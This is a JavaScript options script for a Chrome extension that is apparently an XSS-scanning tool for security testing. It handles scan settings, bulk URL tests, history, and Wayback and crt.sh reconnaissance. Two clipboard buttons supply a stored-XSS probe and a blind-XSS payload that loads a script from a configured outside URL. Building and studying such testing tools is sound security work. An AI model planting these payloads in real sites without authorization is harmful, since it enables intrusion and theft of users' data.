function loadBlacklist() {
	$("#blacklst").empty()
	chrome.storage.local.get({ blacklist: [] }, function (result) {
		var blacklist = result.blacklist;
		for (b = 0; b < blacklist.length; b++) {
			var o = new Option(blacklist[b], blacklist[b]);
			$(o).html(blacklist[b]);
			$("#blacklst").append(o);
		}
	});
}

function loadParambox() {
	$("#paramboxlst").empty()
	chrome.storage.local.get({ param_box: [] }, function (result) {
		var param_box = result.param_box;
		for (b = 0; b < param_box.length; b++) {
			var o = new Option(param_box[b], param_box[b]);
			$(o).html(param_box[b]);
			$("#paramboxlst").append(o);
		}
	});
}

$(document).ready(function () {

	chrome.storage.local.get(["roann"], function (items) {
		if (items["roann"] == "on") {
			$("#title").css("color", "rgb(25, 197, 25)");
		}
	});

	chrome.storage.local.get(["maxreq"], function (items) {
		$("#maxreq").val(items["maxreq"]);
	});

	chrome.storage.local.get(["blindurl"], function (items) {
		$("#blindxss").val(items["blindurl"]);
	});

	chrome.storage.local.get(["onlyget"], function (items) {
		if (items["onlyget"] == "on") {
			$("#onlyGet").prop("checked", true);
		}
	});

	chrome.storage.local.get(["parambox"], function (items) {
		if (items["parambox"] == "on") {
			$("#parambox_check").prop("checked", true);
		}
	});

	chrome.storage.local.get(["crtfilter"], function (items) {
		if (items["crtfilter"] == "on") {
			$("#crt_check").prop("checked", true);
		}
	});

	chrome.storage.local.get(["advanced"], function (items) {
		if (items["advanced"] == "on") {
			$("#advanced").prop("checked", true);
		}
	});

	chrome.storage.local.get(["waybackfilter"], function (items) {
		if (items["waybackfilter"] == "on") {
			$("#wayback_check").prop("checked", true);
		}
	});

	chrome.storage.local.get({ history: [] }, function (result) {
		var history = result.history;
		for (b = 0; b < history.length; b++) {
			$("#historyTable").append("<tr><td>" + history[b][0] + "</td><td>" + history[b][1] + "</td></tr>");
		}
	});

	loadBlacklist();
	loadParambox();

});

$("#maxreq").change(function () {
	chrome.storage.local.set({ "maxreq": $("#maxreq").val() }, null);
});

$("#blindxss").change(function () {
	chrome.storage.local.set({ "blindurl": $("#blindxss").val() }, null);
});

$("#title").click(function () {
	if ($('#title').css("color") != 'rgb(51, 51, 51)') //running
	{
		$("#title").css("color", "rgb(51, 51, 51)");
		chrome.storage.local.set({ "roann": "off" },null);
	} else { //not running
		$("#title").css("color", "rgb(25, 197, 25)");
		chrome.storage.local.set({ "roann": "on" },null);
	}
});

_ = ()=>{};
$("#bulktest").click(function () {
	chrome.storage.local.set({ "bulkurls": $("#bulktext").val().split("\n") },null);
	let sending = chrome.runtime.sendMessage({reqc: "bulk"});
	sending.then(_, _);
});

$("#downloadParambox").click(function () {
	chrome.storage.local.get({ param_box: [] }, function (result) {
		var param_box = result.param_box;
		var blob = new Blob(param_box.map(function(e){return e+"\n"}), {type: "text/plain"});
		var url = URL.createObjectURL(blob);
		chrome.downloads.download({
		url: url
		});
	});
});

$("#onlyGet").click(function () {
	chrome.storage.local.get(["onlyget"], function (items) {
		if (items["onlyget"] == "on") {
			chrome.storage.local.set({ "onlyget": "off" },null);
		} else {
			chrome.storage.local.set({ "onlyget": "on" },null);
		}
	});
});

$("#advanced").click(function () {
	chrome.storage.local.get(["advanced"], function (items) {
		if (items["advanced"] == "on") {
			chrome.storage.local.set({ "advanced": "off" },null);
		} else {
			chrome.storage.local.set({ "advanced": "on" },null);
		}
	});
});

$("#crt_check").click(function () {
	chrome.storage.local.get(["crtfilter"], function (items) {
		if (items["crtfilter"] == "on") {
			chrome.storage.local.set({ "crtfilter": "off" }, null);
		} else {
			chrome.storage.local.set({ "crtfilter": "on" },null);
		}
	});
});

$("#wayback_check").click(function () {
	chrome.storage.local.get(["waybackfilter"], function (items) {
		if (items["waybackfilter"] == "on") {
			chrome.storage.local.set({ "waybackfilter": "off" },null);
		} else {
			chrome.storage.local.set({ "waybackfilter": "on" },null);
		}
	});
});

$("#parambox_check").click(function () {
	chrome.storage.local.get(["parambox"], function (items) {
		if (items["parambox"] == "on") {
			chrome.storage.local.set({ "parambox": "off" },null);
		} else {
			chrome.storage.local.set({ "parambox": "on" },null);
		}
	});
});

$("#clearhistory").click(function () {
	chrome.storage.local.set({ "history": [] }, function () {
		console.log("History cleared!");
		$("#historyTable").empty();
	});
});

$("#storedpayload").click(function () {
	navigator.clipboard.writeText("rNnTRbt=1 x=d'\"><div rNnTRbt='1'>").then(() => {
		console.log("Copied to clipboard!");
	}, () => {
		console.log("Error");
	});
});

$("#blindpayload").click(function () {
	chrome.storage.local.get(["blindurl"], function (items) {
		navigator.clipboard.writeText("'\"><sCriPT src=\"" + items["blindurl"] + "\"></sCriPt>").then(() => {
			console.log("Copied to clipboard!");
		}, () => {
			console.log("Error");
		});
	});
});

$("#delBlacklst").click(function () {
	chrome.storage.local.get({ blacklist: [] }, function (items) {
		items.blacklist.splice($("#blacklst").prop('selectedIndex'), 1);
		chrome.storage.local.set(items, function () {
			alert('Item deleted!');
			loadBlacklist();
		});
	});
});

$("#delParambox").click(function () {
	chrome.storage.local.get({ param_box: [] }, function (items) {
		$("#paramboxlst").empty();
		chrome.storage.local.set({ "param_box":[] },null);
	});
});

$("#addBlacklst").click(function () {
	chrome.storage.local.get({ blacklist: [] }, function (result) {
		var blacklist = result.blacklist;
		blacklist.push([$("#txtBlacklst").val()]);
		chrome.storage.local.set({ blacklist: blacklist }, function () {
			chrome.storage.local.get('blacklist', function (result) {
				$('#myModal').modal('toggle');
				$('#txtBlacklst').val('');
				loadBlacklist();
			});
		});
	});
});

$("#showallurls").click(function () {
	chrome.tabs.query({ currentWindow: true, active: true }, function (tabs) {
		try {
			console.log(tabs[0]);
		} catch (error) {
			console.log(error);
		}
	});
});

// ADDITIONAL SERVICES

$("#wayback").click(function () {
	chrome.tabs.query({ currentWindow: true, active: true }, function (tabs) {
		try {
			let domain = (new URL(tabs[0].url));
			if (domain.hostname.split(".").length > 1) {
				chrome.tabs.create({ url: "http://web.archive.org/cdx/search/cdx?url=*." + domain.hostname.replace("www.", "") + "/*&output=text&fl=original&collapse=urlkey" });
			}
		} catch (error) {
			console.log(error);
		}
	});
});

$("#crtsh").click(function () {
	chrome.tabs.query({ currentWindow: true, active: true }, function (tabs) {
		try {
			let domain = (new URL(tabs[0].url));
			if (domain.hostname.split(".").length > 1) {
				chrome.tabs.create({ url: "https://crt.sh/?q=%." + domain.hostname.replace("www.", "") });
			}
		} catch (error) {
			console.log(error);
		}
	});
});

$(document).ready(function () {
	$("#myInput").on("keyup", function () {
		var value = $(this).val().toLowerCase();
		$("#historyTable tr").filter(function () {
			$(this).toggle($(this).text().toLowerCase().indexOf(value) > -1)
		});
	});
});